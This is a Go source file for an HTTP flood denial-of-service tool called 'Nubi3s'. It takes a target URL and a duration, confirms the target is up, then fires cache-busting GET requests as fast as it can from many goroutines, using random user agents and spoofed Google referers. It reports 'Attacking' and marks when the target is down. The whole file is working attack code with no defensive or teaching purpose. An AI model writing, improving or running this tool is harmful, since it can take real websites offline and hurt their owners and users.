package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync/atomic"
	"time"

	"github.com/corpix/uarand"
	"github.com/gookit/color"
)

var (
	referers = []string{
		"https://www.google.com/?q=",
		"https://www.google.co.uk/?q=",
		"https://www.google.de/?q=",
		"https://www.google.ru/?q=",
		"https://www.google.tk/?q=",
		"https://www.google.cn/?q=",
		"https://www.google.cf/?q=",
		"https://www.google.nl/?q=",
	}
	host         string
	param_joiner string
	reqCount     uint64
	duration     time.Duration
	stopFlag     int32
	downPrinted  int32
)

func clearScreen() {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func buildblock(size int) string {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func get() {
	if strings.ContainsRune(host, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}
	c := http.Client{Timeout: 3500 * time.Millisecond}
	req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", uarand.GetRandom())
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Cache-Control", "no-store, no-cache")
	req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")

	resp, err := c.Do(req)
	atomic.AddUint64(&reqCount, 1)
	if err != nil {
		if atomic.CompareAndSwapInt32(&downPrinted, 0, 1) {
			color.Red.Printf("Target down: %s | Error: %v\n", host, err)
		}
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		if atomic.CompareAndSwapInt32(&downPrinted, 0, 1) {
			color.Red.Printf("Target error: %s | Status: %d\n", host, resp.StatusCode)
		}
	} else {
		color.Green.Printf("Attacking: %s | Status: %d\n", host, resp.StatusCode)
	}
}

func loop() {
	for {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}
		go get()
		time.Sleep(2 * time.Millisecond)
	}
}

func checkTarget() bool {
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(host)
	if err != nil {
		color.Red.Printf("Target seems down: %s | Error: %v\n", host, err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		color.Red.Printf("Target responded but with error | Status: %d\n", resp.StatusCode)
		return false
	}
	color.Green.Printf("Target is live | Status: %d\n", resp.StatusCode)
	return true
}

func banner() {
	color.White.Println(`         _____  _____  ___   __  _____  __    __  __  __    
  /\  /\/__   \/__   \/ _ \ / _\/__   \/__\  /__\/ _\/ _\   
 / /_/ /  / /\/  / /\/ /_)/ \ \   / /\/ \// /_\  \ \ \ \    
/ __  /  / /    / / / ___/  _\ \ / / / _  \//__  _\ \_\ \   
\/ /_/   \/     \/  \/      \__/ \/  \/ \_/\__/  \__/\__/   
                                                           `)
	color.White.Println("                   github.com/Nubi3s\n")
}

func main() {
	clearScreen()
	banner()

	reader := bufio.NewReader(os.Stdin)
	color.Cyan.Print("Nubi3s> ")
	input, _ := reader.ReadString('\n')
	parts := strings.Fields(strings.TrimSpace(input))

	if len(parts) != 3 || parts[0] != "attack" {
		color.Red.Println("Usage: attack <url> <time>")
		os.Exit(1)
	}

	host = parts[1]
	d, err := time.ParseDuration(parts[2])
	if err != nil || d <= 0 {
		color.Red.Println("Invalid time format, example: 30s or 1m")
		os.Exit(1)
	}
	duration = d

	clearScreen()
	banner()
	color.White.Println("Checking target...")
	if !checkTarget() {
		color.Red.Println("Exiting because target seems down.")
		os.Exit(1)
	}

	color.White.Println("Starting Attack")
	color.White.Println("Target:", host)
	color.White.Println("Duration:", duration)
	color.White.Println("Press CTRL+C to stop")
	time.Sleep(2 * time.Second)

	start := time.Now()
	for i := 0; i < 2; i++ {
		go loop()
	}
	time.Sleep(duration)
	color.Blue.Println("\nFinished =>", atomic.LoadUint64(&reqCount), "requests in", time.Since(start))
}
